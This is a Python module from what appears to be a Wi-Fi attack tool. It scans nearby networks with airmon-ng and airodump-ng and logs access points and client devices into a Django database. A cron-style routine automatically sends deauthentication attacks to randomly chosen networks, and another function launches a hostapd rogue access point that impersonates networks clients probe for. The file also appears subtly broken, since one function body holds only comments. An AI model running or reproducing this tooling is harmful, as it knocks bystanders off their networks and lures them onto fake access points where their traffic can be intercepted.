# -*- coding: utf-8
import random, signal
import datetime, time
import subprocess
import traceback
from wifiINFO.hostapd import start_apd
from wifiINFO import config
from wifiINFO.utils import *
from wifiINFO.models import *



def get_interfaces():
    # 获取mon接口
    '''Returns List of AirmonIface objects known by airmon-ng'''
    p = run_cmd(['airmon-ng'])
    interfaces = []

    for line in p.split('\n'):
        # [PHY ]IFACE DRIVER CHIPSET
        airmon_re = re.compile(r'^(?:([^\t]*)\t+)?([^\t]*)\t+([^\t]*)\t+([^\t]*)$')
        matches = airmon_re.match(line)
        if not matches:
            continue

        phy, interface, driver, chipset = matches.groups(1)

        if phy == 'PHY' or phy == 'Interface':
            continue  # Header

        if len(interface.strip()) == 0:
            continue

        interfaces.append(interface)

    return interfaces


#Wi-Fi表格式
def get_wifi(wifi_lines):
    Wifis = []
    for line in wifi_lines:

        try:
            data_list = line.split(',')

            if len(data_list) < 15:
                continue

            Wifi = {}
            Wifi['bssid'] = data_list[0].strip() if validate_mac(data_list[0].strip()) else None
            Wifi['essid'] = is_null(data_list[13].strip())
            Wifi['channel'] = data_list[3].strip()
            if not str(Wifi['channel']).isdigit():
                Wifi['channel'] = '-1'
            Wifi['privacy'] = is_null(data_list[5].strip())
            Wifi['cipher'] = is_null(data_list[6].strip())
            Wifi['authentication'] = is_null(data_list[7].strip())

            Wifis.append(Wifi)

        except Exception as e:
            print(e)
            print('\n','>>>' * 20)
            print(traceback.print_exc())
            print('\n','>>>' * 20)
            print(traceback.format_exc())


    return (Wifis)


#Station格式
def get_station(station_lines):
    Stations = []

    for line in station_lines:
        try:
            data_list = line.split(', ')

            if len(data_list) != 6:
                continue

            Station = {}
            Station['client'] = data_list[0].strip()
            Station['client'] = data_list[0].strip() if validate_mac(data_list[0].strip()) else None
            Station['bssid'] = data_list[5][0:17].strip() if validate_mac(data_list[5][0:17].strip()) else None
            Station['essid'] = is_null(data_list[5][18:].strip())
            Stations.append(Station)

        except Exception as e:
            print(e)
            print('\n','>>>' * 20)
            print(traceback.print_exc())
            print('\n','>>>' * 20)
            print(traceback.format_exc())


    return (Stations)


def data_wifi(wifi_lines):
    """
    添加与修改分流
        @if
            完全相同则跳过
        @elif
            bssid不存在，新增
        @else
            bssid存在,任意变换则更新
    """
    new_wifi_list =get_wifi(wifi_lines)

    old_wifi_query = Wifilog.objects.all()

    old_wifi_set = set(old_wifi_query.values_list('bssid', 'essid', 'channel', 'privacy', 'cipher', 'authentication'))
    old_bssid_set = set(old_wifi_query.values_list('bssid'))
    create_list = []
    update_list = []

    for new_wifi in new_wifi_list:
        if tuple(new_wifi.values()) in old_wifi_set:
            continue
        elif tuple({'bssid':new_wifi['bssid']}.values()) not in old_bssid_set:
            create_list.append(
                Wifilog(
                    bssid=new_wifi['bssid'],
                    essid=new_wifi['essid'],
                    channel=new_wifi['channel'],
                    privacy=new_wifi['privacy'],
                    cipher=new_wifi['cipher'],
                    authentication=new_wifi['authentication'],
                    first_time=datetime.datetime.now(),
                    last_time=datetime.datetime.now()
                )
            )
        else:
            temp_value = old_wifi_query.get(bssid=new_wifi['bssid'])

            temp_value.essid = new_wifi['essid']
            temp_value.channel = new_wifi['channel']
            temp_value.privacy = new_wifi['privacy']
            temp_value.cipher = new_wifi['cipher']
            temp_value.authentication = new_wifi['authentication']
            temp_value.last_time = datetime.datetime.now()

            update_list.append(temp_value)

    try:
        Wifilog.objects.bulk_create(create_list)
        Wifilog.objects.bulk_update(
        update_list, ['essid', 'channel', 'privacy', 'cipher', 'authentication']
        )
    except Exception as e:
        print(e)
        print('\n','>>>' * 20)
        print(traceback.print_exc())
        print('\n','>>>' * 20)
        print(traceback.format_exc())



def data_station(station_lines):
    """
    添加与修改分流
        @if
            完全相同则跳过
        @elif
            client+bssid不存在，新增
        @else
            client与bssid存在，essid不存在，更新essid列表
    """

    new_station_list = get_station(station_lines)  ###解析station类目文本

    old_station_query = Stationlog.objects.all()

    old_station_set = set(old_station_query.values_list('client', 'bssid', 'essid'))
    old_client_bssid_set = set(old_station_query.values_list('client', 'bssid'))
    create_list = []
    update_list = []

    for new_station in new_station_list:
        if tuple(new_station.values()) in old_station_set:
            """完全相同排除"""
            continue
        elif tuple({'client': new_station['client'], 'bssid': new_station['bssid']}.values()) \
                not in old_client_bssid_set:  # 生成字典元组进行存在判定
            """client与bssid不同，新增"""
            create_list.append(
                Stationlog(
                    client=new_station['client'],
                    bssid=new_station['bssid'],
                    essid=new_station['essid'],
                    first_time=datetime.datetime.now(),
                    last_time=datetime.datetime.now()
                )
            )
        else:
            """client与bssid相同，essid不同，更新essid"""
            temp_value = old_station_query.get(client=new_station['client'], bssid=new_station['bssid'])
            """获取数据set"""
            old_essid_set = {} if temp_value.essid is None else set(temp_value.essid.split(','))
            temp_essid_set = {} if new_station['essid'] is None else set(new_station['essid'].split(','))
            new_essid_list = list(old_essid_set)

            for new_essid in temp_essid_set:
                if new_essid not in old_essid_set:
                    new_essid_list.append(new_essid)

            temp_value.essid = ','.join(new_essid_list)
            temp_value.last_time = datetime.datetime.now()
            update_list.append(temp_value)
    try:
        Stationlog.objects.bulk_create(create_list)
        Stationlog.objects.bulk_update(
            update_list, ['essid', 'last_time']
        )
    except Exception as e:
        
        print('\n','>>>' * 20)
        print(traceback.print_exc())
        print('\n','>>>' * 20)
        print(traceback.format_exc())



#启动
def start_airmon():
    LOGDIR = config.get_value('LOGDIR')
    LOGNAME = config.get_value('LOGNAME')
    LOG = "{}/{}-01.csv".format(LOGDIR,LOGNAME)

    try:
        subprocess.Popen([
            'rm',
            LOG,
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        print(e.args)
        return False

    try:
        interfaces = get_interfaces()
        MONFACE, ATKFACE = interfaces

        subprocess.Popen([
            'iwconfig',
            MONFACE,
            'mode',
            'monitor'
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        
        print('\n','>>>' * 20)
        print(traceback.print_exc())
        print('\n','>>>' * 20)
        print(traceback.format_exc())

        return False

    try:
        config.set_value('MONFACE', MONFACE)
        config.set_value('ATKFACE', ATKFACE)
        process = subprocess.Popen([
            'airodump-ng',
            MONFACE,
            '-w',
            LOGNAME,
            '--output-format',
            'csv',
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception as e:
        
        print('\n','>>>' * 20)
        print(traceback.print_exc())
        print('\n','>>>' * 20)
        print(traceback.format_exc())

        return False

    for count in range(0,3):  # 启动
        time.sleep(10)  # 启动等待

        if os.path.exists(LOG):
            if os.stat(LOG).st_size > 200:
               #    测试用
                config.set_value('MAIN_STATUS',1)
                return process.pid
        else:
            os.kill(process.pid, signal.SIGKILL)

    try:
        os.kill(process.pid, signal.SIGKILL)
        return False
    except:
        return False


def random_target():
    LOGDIR = config.get_value('LOGDIR')
    LOGNAME = config.get_value('LOGNAME')
    LOG = "{}/{}-01.csv".format(LOGDIR, LOGNAME)

    wifi_lines, station_lines = file_parse(LOG)
    new_wifi_list = get_wifi(wifi_lines)
    new_station_list = get_station(station_lines)

    channel_list = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 34, 36, 38,
                    40, 42, 44, 46, 48,52, 56, 60, 64, 100, 104, 108, 112, 116, 120,
                    124, 128, 132, 136, 140, 149,153, 157, 161, 165, 183, 184, 185, 187, 188, 189, 192, 196]

    for count in range(0,10):
        random_wifi = random.choice(new_wifi_list)
        if random_wifi['essid'] is not None and random_wifi['privacy'] in ('OPN', None) \
                and int(random_wifi['channel']) not in channel_list:
            continue
        elif not Wifilog.objects.filter(bssid=random_wifi['bssid']).exists():
            continue

        for station in new_station_list:
            if station['bssid'] == random_wifi['bssid'] and station['essid'] is None:
                return random_wifi

    return None


def cron_atk():
    if not config.get_value('MAIN_STATUS'):
        return

    if not config.get_value('ATK_STATUS'):
        return

    ATKFACE = config.get_value('ATKFACE')

    time1 = time.time()

    try:
        random_wifi = random_target()

        if random_wifi:
            bssid, channel = random_wifi['bssid'], random_wifi['channel']
            process = deauth(ATKFACE, bssid, channel)
            time.sleep(20)
            try:
                process.kill()
            except Exception as e:
                
                print('\n','>>>' * 20)
                print(traceback.print_exc())
                print('\n','>>>' * 20)
                print(traceback.format_exc())

            time2 = time.time()
            print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            print(("{}:Attack").format(random_wifi['bssid']))
            print('CronATK消耗:{}'.format(time2 - time1))
        else:
            print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
            print("超时跳过")
    except Exception as e:
        
        print('\n','>>>' * 20)
        print(traceback.print_exc())
        print('\n','>>>' * 20)
        print(traceback.format_exc())

        return False


def cron_data():
    if not config.get_value('MAIN_STATUS'):
        return

    LOGDIR = config.get_value('LOGDIR')
    LOGNAME = config.get_value('LOGNAME')
    LOG = "{}/{}-01.csv".format(LOGDIR, LOGNAME)
    time1 = time.time()
    try:
        wifi_lines, station_lines = file_parse(LOG)
        data_wifi(wifi_lines)
        data_station(station_lines)

        time2 = time.time()
        print(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print('CronLOG消耗:{}'.format(time2 - time1))
    except Exception as e:
        
        print('\n','>>>' * 20)
        print(traceback.print_exc())
        print('\n','>>>' * 20)
        print(traceback.format_exc())

        return


def cron_nativelog():
    LOGDIR = config.get_value('LOGDIR')
    LOGNAME = config.get_value('LOGNAME')
    LOG = "{}/{}-01.csv".format(LOGDIR, LOGNAME)


    wifi_lines, station_lines = file_parse(LOG)
    new_wifi_list = get_wifi(wifi_lines)
    new_station_list =get_station(station_lines)

    create_list = []

    for wifi in new_wifi_list:
        bssid = wifi['bssid']
        channel = wifi['channel']
        privacy = wifi['privacy']
        cipher = wifi['cipher']
        authentication = wifi['authentication']
        essid = wifi['essid'] if wifi['essid'] is not None else ''
        client = []
        for station in new_station_list:
            if station['bssid'] == bssid:

                if essid == '':
                    if station['essid'] is not None:
                        essid += station['essid']

                client.append(station['client'])

        client = is_null(','.join(client))
        essid = is_null(essid)

        create_list.append(
            Nativelog(
                bssid=bssid,
                essid=essid,
                client=client,
                channel=channel,
                privacy=privacy,
                cipher=cipher,
                authentication=authentication
            )
        )


    try:
        Nativelog.truncate()
        Nativelog.objects.bulk_create(create_list)

    except Exception as e:
        
        print('\n','>>>' * 20)
        print(traceback.print_exc())
        print('\n','>>>' * 20)
        print(traceback.format_exc())

        pass


def attack_native_wifi(bssid, channel):
    ATKFACE =config.get_value('ATKFACE')
    try:
        deauth(ATKFACE, bssid, channel)
    except Exception as e:
        
        print('\n','>>>' * 20)
        print(traceback.print_exc())
        print('\n','>>>' * 20)
        print(traceback.format_exc())



def hostapd_client(client):
    ATKFACE = config.get_value('ATKFACE')
    LOGDIR = config.get_value('LOGDIR')
    LOGNAME = config.get_value('LOGNAME')
    LOG = "{}/{}-01.csv".format(LOGDIR, LOGNAME)

    # fro
    #
    # try:
    #     deauth(ATKFACE, bssid, channel)
    # #     start_apd(ATKFACE, essid, channel)
    #
    #
    # except Exception as e:
    #     
def atk_client(client):
    ATKFACE = config.get_value('ATKFACE')
    station = Stationlog.objects.filter(client=client).values('essid','channel')
    if station.count() == 1:
        station =station.get()
        if station['essid'] is None or station['channel'] < 0:
            return False
        essid = station['essid']
        channel = station['channel']
    else:
        return False

    start_apd(ATKFACE, essid, channel)
